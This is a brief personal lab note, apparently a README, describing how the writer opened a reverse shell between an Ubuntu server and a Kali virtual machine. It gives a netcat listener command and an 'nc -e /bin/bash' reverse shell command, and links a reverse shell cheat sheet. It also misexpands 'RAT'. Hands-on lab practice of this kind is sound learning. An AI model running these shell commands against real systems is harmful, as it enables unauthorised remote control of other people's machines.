This was scary easy.

Rat means = remote attacker terminal 

I made a clone of a Ubuntu server on my vmware then a kali on my vmware 

I created a listener on the Ubuntu Server after logging into root on the server via the sudo -i command
I then used the command nc -lnvp 87 -s (my source ip) 87 (port) to create the listener

Then I used the nc -e /bin/bash (my ip) 87 (port)
on the kali vm I wanted to control

This opened a reverse shell on the target machine

This information came from this youtube video on reverse shelling

This github was useful for the commands needed
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

This github also gave the payloads for the reverse shells
